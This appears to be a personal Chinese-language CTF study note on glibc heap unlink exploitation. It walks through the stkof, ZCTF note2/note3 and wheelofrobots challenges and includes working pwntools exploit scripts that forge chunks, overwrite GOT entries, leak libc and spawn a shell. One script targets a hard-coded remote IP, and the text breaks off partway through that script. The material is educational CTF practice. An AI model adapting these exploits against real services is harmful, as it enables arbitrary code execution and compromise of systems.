+<a name="7242g9rk887hajc339r7i4tgai">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6fchp5qfc7oqtp2q7fjavdc6ju.png"></p>
+<h3 class="topic">
+<a name="415efalit9n3v8ie0cgvvrh52n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序中payload构建了一个伪造的chunk块，整个chunk的大小为0x30字节，该伪造的chunk被保存在idx2堆块的用户空间中（该用户空间正好为0x30字节），同时payload还将idx3堆块的pre_size 和size字段溢出覆盖，使得idx3堆块的上一个堆块变为size为0x30，且已经被释放的伪造chunk，此时如果释放idx3堆块，会导致堆块合并，则伪造的堆块会执行unlink操作</a>
+</h3>
+<h3 class="topic">
+<a name="2vang5rnumreecs3uil392che2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时通过往蓝色chunk的用户内存中写入数据，从而在其中构造伪造的黄色chunk，该chunk与下面的绿色chunk相邻，当绿色chunk释放时，如果黄色chunk时free的，此时会堆块合并，从而将黄色的chunk进行unlink，此时黄色chunk中的fd bk指针就会被利用</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7v3oqh90ekohtgeccrd1ebvarp.png"></p>
+<h3 class="topic">
+<a name="39dbc4cdak5hopsr4oucabng0b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在伪造的chunk中 &#13;
+fd=head + 16 - 0x18&#13;
+bk=head + 16 - 0x10</a>
+</h3>
+<h3 class="topic">
+<a name="4slej9ambh4n2g18i9dbs72ovv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里的head为一个给定的值0x602140，该值对应内存位于bss段，该地址为bss段中指针数组的首地址，该指针数组用于保存每次申请堆块时malloc函数的返回值，即所有chunk的用户空间的首地址</a>
+</h3>
+<h3 class="topic">
+<a name="3oirjt6aktqsfluarphadh54g0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以这里head+16对应的内存空间中保存着idx2chunk的用户空间的地址</a>
+</h3>
+<h3 class="topic">
+<a name="6b1i001sn030l3g5o5a0hgbu12">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1voeofeopr5hvl53194s7icea4.png"></p>
+<h3 class="topic">
+<a name="1c2t4iao92ebvkv7k1faj4lm4f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当执行free(3),即会释放idx3的chunk，此时因为idx3chunk的pre_size size字段被溢出修改，所以会显示idx3chunk相邻的0x30大小的伪造chunk是free的，所以产生堆块合并，从而将伪造的chunk进行unlink</a>
+</h3>
+<h3 class="topic">
+<a name="0gnomk4l79vij2r3v4rtt7bsdo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将伪造的chunk进行unlink大题分为两步</a>
+</h3>
+<h3 class="topic">
+<a name="6c52ibvp06hpdp200khh36bakm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检验fd bk指针的指向</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/11orrcrm313qhh59477m7313mc.png"></p>
+<h3 class="topic">
+<a name="27hpjkejhm2qvfa15vv1bq5kv0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时&#13;
+FD=p-&gt;fd=head + 16 - 0x18&#13;
+BK=p-&gt;fd=head + 16 - 0x10&#13;
+FD-&gt;bk=head+16-0x18+0x18=head+16&#13;
+BK-&gt;fd=head +16 - 0x10+0x10=head+16&#13;
+而地址head+16中保存指向idx3chunk的用户空间的指针，即*(head+16)=p，所以可以绕过第二种检验</a>
+</h3>
+<h3 class="topic">
+<a name="17mkvrbhrcm58sqg6p447p5c2d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是这里有一个疑问，最开始FD=p-&gt;fd中的p应该为指向伪造chunk的指针，因为此时是伪造的chunk要进行断链，但是*(head+16)=p中的p为指向idx3chunk用户空间的指针，这两个p是不一样的，这样与FD-&gt;bk==P BK-&gt;fd==P验证的意义不相符</a>
+</h3>
+<h3 class="topic">
+<a name="7ddbh2v4n81uo87ajejmsmagel">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;部分资料疑似表示只要最终FD-&gt;bk与BK-&gt;fd相等，即可通过验证，主要取决于_builtin_expect()函数的具体执行过程</a>
+</h3>
+<h3 class="topic">
+<a name="581pn0f2l04v16odn91f57f0h6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行&#13;
+FD-&gt;bk=BK&#13;
+BK-&gt;fd=FD</a>
+</h3>
+<h3 class="topic">
+<a name="24un23m30iucvq5d5e0dad556i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd -&gt; bk = bk ===&gt; [head + 16 - 0x18 + 0x18] = head + 16 - 0x10&#13;
+[0x602150] = 0x602140&#13;
+bk -&gt; fd = fd ===&gt; [head + 16 - 0x10 + 0x10] = head + 16 - 0x18&#13;
+[0x602150] = 0x602138</a>
+</h3>
+<h3 class="topic">
+<a name="4d9e6gvf28p0nim2ofr80mm8rb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7b35g2l26o4u7q4je3kfabp5at.png"></p>
+<h3 class="topic">
+<a name="40rj6b7rqeojq012n6gd7btdfg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;错误的</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0vmfkpi4fpcoeql5tckjn3fevn.png"></p>
+<h3 class="topic">
+<a name="1cr4jd3uh3e6iaql68bg864jaq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got&#13;
+    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(&#13;
+        stkof.got['atoi'])&#13;
+    edit(2, len(payload), payload)&#13;
+    # edit free@got to puts@plt&#13;
+    payload = p64(stkof.plt['puts'])&#13;
+    edit(0, len(payload), payload)</a>
+</h3>
+<h3 class="topic">
+<a name="5gife1d4ri8t35c81t9eevr68a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再次构造payload，并且利用edit函数向idx2chunk中写入数据，此时指向idx2chunk的指针已经被修改为0x602138 ,所以相关数据被保存到0x602138起始的内存空间</a>
+</h3>
+<h3 class="topic">
+<a name="3j28ptho3a633n8pmnvvvap0en">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3d1efsaveg8cr8aucjf3u21ms1.png"></p>
+<h3 class="topic">
+<a name="46qfpradgjcl5l6rdrcc53l2j8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过执行edit(0, len(payload), payload)将puts函数的地址写入放到idx0指向的内存空间中，由于之前的溢出，idx0的数据已经被修改为free@got，所以此步将puts函数的地址保存到了free函数的got表项，此后调用free函数就会执行puts函数</a>
+</h3>
+<h3 class="topic">
+<a name="0619uefph8o8lm9q8aq7g6jupr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    #free global[1] to leak puts addr&#13;
+    free(1)&#13;
+    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')&#13;
+    puts_addr = u64(puts_addr)&#13;
+    log.success('puts addr: ' + hex(puts_addr))&#13;
+    libc_base = puts_addr - libc.symbols['puts']&#13;
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))&#13;
+    system_addr = libc_base + libc.symbols['system']&#13;
+    log.success('libc base: ' + hex(libc_base))&#13;
+    log.success('/bin/sh addr: ' + hex(binsh_addr))&#13;
+    log.success('system addr: ' + hex(system_addr))</a>
+</h3>
+<h3 class="topic">
+<a name="698je3mq1n05m11i13s063ktfj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行free(1), 此时idx1已经被修改为puts@got，并且free的got表项也被改写，所以此时相当于执行了puts(puts@got)，从而泄露put函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="6bkemmq9r8nldjnmago517up09">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据泄露出的puts函数的地址，计算libc的首地址，进一计算system函数地址和'/bin/sh'字符串地址</a>
+</h3>
+<h3 class="topic">
+<a name="665avm7lscul400vkubpekbtd1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binsh_addr = libc_base + next(libc.search('/bin/sh'))该指令next函数的用法没有见过，下来继续查一下</a>
+</h3>
+<h3 class="topic">
+<a name="072jfnt7534mc8d2ak6pgq2ioi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    # modify atoi@got to system addr&#13;
+    payload = p64(system_addr)&#13;
+    edit(2, len(payload), payload)&#13;
+    p.send(p64(binsh_addr))&#13;
+    p.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="6h7u2b8pmk14voacuhc9978m5i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过edit函数将idx对应的atoi@got内存中的数据修改为system函数的地址，只要执行atio函数就相当于执行system函数</a>
+</h3>
+<h3 class="topic">
+<a name="4so92mm7enov0qt1mopinkenbp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;atio函数用于将字符串转换为数字，此时执行p.send函数，原本漏洞程序接收到数据后会调用atio函数从而将字符串转为数字，从而决定执行哪一个程序功能，此时atio函数被劫持为system函数，并且以"/bin/sh"字符串的地址作为参数，就会执行system('/bin/sh')获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="3l19lbjmftf1f9ir9u6gvkidvp">&nbsp;&nbsp;&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/qq_33528164/article/details/79586902" name="5bb3fepakeptmn6ra5vb0s300c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/qq_33528164/article/details/79586902</a>
+</h3>
+<h3 class="topic">
+<a name="0nrjaj28chvsf4a27tlo12itpf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/Maxmalloc/article/details/84970447</a>
+</h3>
+<h3 class="topic">
+<a name="7qqkfcntvkmb4hk5tv4bgtg8iq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.2cto.com/os/201607/530041.html</a>
+</h3>
+<h3 class="topic">
+<a name="5fln7nikp5ent8l689uao6pgqt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/donghanhang/article/details/51777390</a>
+</h3>
+<h3 class="topic">
+<a name="50o5n0ncvdhb8oc8qse40l6lc3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://wooyun.kieran.top/#!/drops/653.%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95</a>
+</h3>
+<h3 class="topic">
+<a name="5p3t7bba7tv5p6ajpov1tf7736">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html</a>
+</h3>
+<h3 class="topic">
+<a name="19v7q7kbd8hlgpcr0995g2ja2l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://yunnigu.dropsec.xyz/2017/04/05/堆溢出之unlink的利用/</a>
+</h3>
+<h3 class="topic">
+<a name="4enccvq0pepvbnfh4n8fc53miq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;glibc内存分配与回收</a>
+</h3>
+<h3 class="topic">
+<a name="65qobf7u9psm8nu269t01dbvq6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.2cto.com/os/201607/530041.html</a>
+</h3>
+<h3 class="topic">
+<a name="7hh960m3j4cr5g4h6vo5dm2qjv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/donghanhang/article/details/51777390</a>
+</h3>
+<h3 class="topic">
+<a name="6hielom276n0igo1t63e9l998l">&nbsp;&nbsp;&nbsp;&nbsp;题目链接</a>
+</h3>
+<h3 class="topic">
+<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof" name="481uhfp2nqgp96ak0q0vogaoqu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a>
+</h3>
+<h3 class="topic">
+<a name="0bnjf0g06n4d0kakevecu7f0fq">&nbsp;&nbsp;&nbsp;2016 ZCTF note2</a>
+</h3>
+<h3 class="topic">
+<a name="3r58t427hdosc8nku3cr7egft9">&nbsp;&nbsp;&nbsp;&nbsp;分析程序</a>
+</h3>
+<h3 class="topic">
+<a name="7c964lgp01i4nfhpn2kiriderg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/34nrbng4hc688td6igokcj8b7e.png"></p>
+<h3 class="topic">
+<a name="3qjt6uagkn4fe8jg10simeg765">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/43vbcb7fnafd1uad2e5f5ajdje.png"></p>
+<h3 class="topic">
+<a name="04jja2idf7ft44dfievqmk9k1j">&nbsp;&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="0edsl4goi0k7r313du3o4lraum">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列举程序基本操作</a>
+</h3>
+<h3 class="topic">
+<a name="2u8n91e9p10l1oi9tioonj5mlu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/4a1gg13o4g7uk9keat47lkdmbm.png"></p>
+<h3 class="topic">
+<a name="5473e9p3961nm5es6mr5j4aru1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生成三个note</a>
+</h3>
+<h3 class="topic">
+<a name="4fbj38id1c6ugguqp9ro8cosfu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/69gdt51hrind8euod5jcphtdct.png"></p>
+<h3 class="topic">
+<a name="5hlfbcun4h62td5rd9vitctvp7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时堆中情况为</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2gje9unq0er6hfurd3lugb2gmo.png"></p>
+<h3 class="topic">
+<a name="0m8ijr9s3orum7v7keba0dunac">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放chunk1-覆盖chunk2-释放chunk2</a>
+</h3>
+<h3 class="topic">
+<a name="6d6vsl0a99gabumk14osre6jgo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/44aebrufm8t6e26fn894asab6j.png"></p>
+<h3 class="topic">
+<a name="2ej9psb0pj8g5ncnmj3ekv3qj2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1nfbudnhrdt0g63lddifeunuvt.png"></p>
+<h3 class="topic">
+<a name="4dmmttv95s6crdo03ldd32vu5h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为伪造chunk中	&#13;
+ptr = 0x0000000000602120&#13;
+fakefd = ptr - 0x18&#13;
+fakebk = ptr - 0x10&#13;
+其中ptr就是chunk指针数组首地址，所以unlink发生后ptr[0]中的内容被修改为ptr-0x18</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3djvum8k12o8ieenj24oin9vfd.png"></p>
+<h3 class="topic">
+<a name="5ojqrdndgmer5qe5ua9f9jn0ji">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露atio函数地址，计算libc和sysytem函数地址</a>
+</h3>
+<h3 class="topic">
+<a name="1fidb8li39n3hjaqpc2h83v40u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0uah1kph4tr6qv134801stopbd.png"></p>
+<h3 class="topic">
+<a name="1dnk2t3jc16b12tnuhm8i0a64h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改atio@got中的内容为system函数地址，获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="4sq2049rmss54smjbnailubghe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/59ghino441lpafnen9a1lkfust.png"></p>
+<h3 class="topic">
+<a name="3r95c6fj8mnleij95losljim1m">&nbsp;&nbsp;&nbsp;2017 insomni'hack wheelofrobots（时间关系没有仔细看，但是思路与之前一致）</a>
+</h3>
+<h3 class="topic">
+<a name="4gdmsjv8ls0clqthb662qtkfog">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/26ldo10mva7opgqu46593or1g5.png"></p>
+<h3 class="topic">
+<a name="5m6hii7hsjfcotubdg0b05c305">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7b4a1gm1lthtp64b0813lasjve.png"></p>
+<h3 class="topic">
+<a name="4boqf9i8fp27l5srml661ahdg6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0389c88a6anhl7dqr18frsf4ip.png"></p>
+<h3 class="topic">
+<a name="0u326vgbavror4bmh5jmgnvloj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="0v5i2l1mrgogcfdvvb67i15c9i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from pwn import *&#13;
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']&#13;
+if args['DEBUG']:&#13;
+    context.log_level = 'debug'&#13;
+context.binary = "./wheelofrobots"&#13;
+robots = ELF('./wheelofrobots')&#13;
+if args['REMOTE']:&#13;
+    p = remote('127.0.0.1', 7777)&#13;
+else:&#13;
+    p = process("./wheelofrobots")&#13;
+log.info('PID: ' + str(proc.pidof(p)[0]))&#13;
+libc = ELF('./libc.so.6')&#13;
+&#13;
+&#13;
+def offset_bin_main_arena(idx):&#13;
+    word_bytes = context.word_size / 8&#13;
+    offset = 4  # lock&#13;
+    offset += 4  # flags&#13;
+    offset += word_bytes * 10  # offset fastbin&#13;
+    offset += word_bytes * 2  # top,last_remainder&#13;
+    offset += idx * 2 * word_bytes  # idx&#13;
+    offset -= word_bytes * 2  # bin overlap&#13;
+    return offset&#13;
+&#13;
+&#13;
+def add(idx, size=0):&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline('1')&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline(str(idx))&#13;
+    if idx == 2:&#13;
+        p.recvuntil("Increase Bender's intelligence: ")&#13;
+        p.sendline(str(size))&#13;
+    elif idx == 3:&#13;
+        p.recvuntil("Increase Robot Devil's cruelty: ")&#13;
+        p.sendline(str(size))&#13;
+    elif idx == 6:&#13;
+        p.recvuntil("Increase Destructor's powerful: ")&#13;
+        p.sendline(str(size))&#13;
+&#13;
+&#13;
+def remove(idx):&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline('2')&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline(str(idx))&#13;
+&#13;
+&#13;
+def change(idx, name):&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline('3')&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline(str(idx))&#13;
+    p.recvuntil("Robot's name: \n")&#13;
+    p.send(name)&#13;
+&#13;
+&#13;
+def start_robot():&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline('4')&#13;
+&#13;
+&#13;
+def overflow_benderinuse(inuse):&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.sendline('1')&#13;
+    p.recvuntil('Your choice :')&#13;
+    p.send('9999' + inuse)&#13;
+&#13;
+&#13;
+def write(where, what):&#13;
+    change(1, p64(where))&#13;
+    change(6, p64(what))&#13;
+&#13;
+&#13;
+def exp():&#13;
+    print "step 1"&#13;
+    # add a fastbin chunk 0x20 and free it&#13;
+    # so it is in fastbin, idx2-&gt;NULL&#13;
+    add(2, 1)  # idx2&#13;
+    remove(2)&#13;
+    # overflow bender inuse with 1&#13;
+    overflow_benderinuse('\x01')&#13;
+    # change bender's fd to 0x603138, point to bender's size&#13;
+    # now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL&#13;
+    change(2, p64(0x603138))&#13;
+    # in order add bender again&#13;
+    overflow_benderinuse('\x00')&#13;
+    # add bender again, fastbin 0x603138-&gt;NULL&#13;
+    add(2, 1)&#13;
+    # in order to malloc chunk at 0x603138&#13;
+    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20&#13;
+    # it is at Robot Devil&#13;
+    add(3, 0x20)&#13;
+    # trigger malloc, set tinny point to 0x603148&#13;
+    add(1)&#13;
+    # wheels must &lt;= 3&#13;
+    remove(2)&#13;
+    remove(3)&#13;
+&#13;
+    print 'step 2'&#13;
+    # alloc Destructor size 60-&gt;0x50, chunk content 0x40&#13;
+    add(6, 3)&#13;
+    # alloc devil, size=20*7=140, bigger than fastbin&#13;
+    add(3, 7)&#13;
+    # edit destructor's size to 1000 by tinny&#13;
+    change(1, p64(1000))&#13;
+    # place fake chunk at destructor's pointer&#13;
+    fakechunk_addr = 0x6030E8&#13;
+    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(&#13;
+        fakechunk_addr - 0x10) + p64(0x20)&#13;
+    fakechunk = fakechunk.ljust(0x40, 'a')&#13;
+    fakechunk += p64(0x40) + p64(0xa0)&#13;
+    change(6, fakechunk)&#13;
+    # trigger unlink&#13;
+    remove(3)&#13;
+&#13;
+    print 'step 3'&#13;
+    # make 0x6030F8 point to 0x6030E8&#13;
+    payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)&#13;
+    change(6, payload)&#13;
+&#13;
+    print 'step 4'&#13;
+    # make exit just as return&#13;
+    write(robots.got['exit'], 0x401954)&#13;
+&#13;
+    print 'step 5'&#13;
+    # set wheel cnt =3, 0x603130 in order to start robot&#13;
+    write(0x603130, 3)&#13;
+    # set destructor point to puts@got&#13;
+    change(1, p64(robots.got['puts']))&#13;
+    start_robot()&#13;
+    p.recvuntil('New hands great!! Thx ')&#13;
+    puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')&#13;
+    puts_addr = u64(puts_addr)&#13;
+    log.success('puts addr: ' + hex(puts_addr))&#13;
+    libc_base = puts_addr - libc.symbols['puts']&#13;
+    log.success('libc base: ' + hex(libc_base))&#13;
+    system_addr = libc_base + libc.symbols['system']&#13;
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))&#13;
+&#13;
+    # make free-&gt;system&#13;
+    write(robots.got['free'], system_addr)&#13;
+    # make destructor point to /bin/sh addr&#13;
+    write(0x6030E8, binsh_addr)&#13;
+    # get shell&#13;
+    remove(6)&#13;
+    p.interactive()&#13;
+&#13;
+    pass&#13;
+&#13;
+&#13;
+if __name__ == "__main__":&#13;
+    exp()</a>
+</h3>
+<h3 class="topic">
+<a name="2rc44m3el75lfld4g625grjt82">&nbsp;&nbsp;&nbsp;&nbsp;题目&para;&#13;
+DEFCON 2017 Qualifiers beatmeonthedl &#13;
+参考&para;&#13;
+malloc@angelboy&#13;
+https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a</a>
+</h3>
+<h3 class="topic">
+<a name="7d4ersi6lo6thhvatvmtp6kdkt">&nbsp;&nbsp;&nbsp;2016 ZCTF note3</a>
+</h3>
+<h3 class="topic">
+<a name="3unapmcajnlt2gnkjfq7m4vsu6">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3te4eu3feorl6memgctu8gvqq9.png"></p>
+<h3 class="topic">
+<a name="01lus4pp3dm3a2cvv5o7u2oan5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/63l5vlt4qsji2i3280vtmo9qbj.png"></p>
+<h3 class="topic">
+<a name="0tugnm929aefthnanf056e9utj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6akdb0abbhsa3uodht8pc8gdo8.png"></p>
+<h3 class="topic">
+<a name="5mdukld6idsistj3reur2l86qe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用核心原理，与之前的一样</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/16s4jp7vh0a2iecmrk2elsqgae.png"></p>
+<h3 class="topic">
+<a name="7g98v5rm4ppnv8p0hff27uih22">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样通过修改bss段中的chunk数组，然后使用程序提供的chunk编辑功能，就可以实现任意地址写数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/5ee9gcjdfkq1mmmcfa2bvksmji.png"></p>
+<h3 class="topic">
+<a name="5i2u7r974fo09djpnoq96fp2ri">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="18kdhm82fh0gog33gubsr3kpkn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/python&#13;
+# -*- coding: utf-8 -*-&#13;
+from pwn import *&#13;
+import time&#13;
+def malloc(size,data):&#13;
+    print conn.recvuntil('&gt;&gt;')&#13;
+    conn.sendline('1')&#13;
+    print conn.recvuntil('1024)')&#13;
+    conn.sendline(str(size))&#13;
+    print conn.recvuntil('content:')&#13;
+    conn.sendline(data)&#13;
+    print conn.recvuntil('\n')&#13;
+def edit(id,data):&#13;
+    print conn.recvuntil('&gt;&gt;')&#13;
+    conn.sendline('3')&#13;
+    print conn.recvuntil('note:')&#13;
+    conn.sendline(str(id))&#13;
+    print conn.recvuntil('ent:')&#13;
+    conn.sendline(data)&#13;
+    print conn.recvuntil('success')&#13;
+def free(id):&#13;
+    print conn.recvuntil('&gt;&gt;')&#13;
+    conn.sendline('4')&#13;
+    print conn.recvuntil('note:')&#13;
+    conn.sendline(str(id))&#13;
+    print conn.recvuntil('success')&#13;
+&#13;
+#conn = remote('127.0.0.1',9999)&#13;
+conn = remote('115.28.27.103',9003)&#13;
+free_got = p64(0x602018)&#13;
+puts_got = p64(0x602020)&#13;
+stack_got = p64(0x602038)&#13;
+printf_got = p64(0x602030)&#13;
+exit_got = p64(0x602078)&#13;
+printf_plt = p64(0x400750)&#13;
+puts_plt = p64(0x400730)&#13;
+#libcstartmain_ret_off = 0x21b45&#13;
+#sys_off = 0x414f0&#13;
+libcstartmain_ret_off = 0x21ec5&#13;
+sys_off = 0x46640&#13;
+# 1. int overflow lead to double free&#13;
+intoverflow = -9223372036854775808&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,'/bin/sh\0')&#13;
+malloc(512,p64(0x400ef8))&#13;
+malloc(512,'/bin/sh\0')&#13;
+# 2. make a fake chunk and modify the next chunk's pre size &#13;
+fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16)&#13;
+edit(3,'aaaaaa')&#13;
+edit(intoverflow,fakechunk)&#13;
+# 3. double free&#13;
+free(4)&#13;
+# 4. overwrite got&#13;
+edit(3,free_got)&#13;
+edit(0,printf_plt+printf_plt)&#13;
+# 5. leak the stack data&#13;
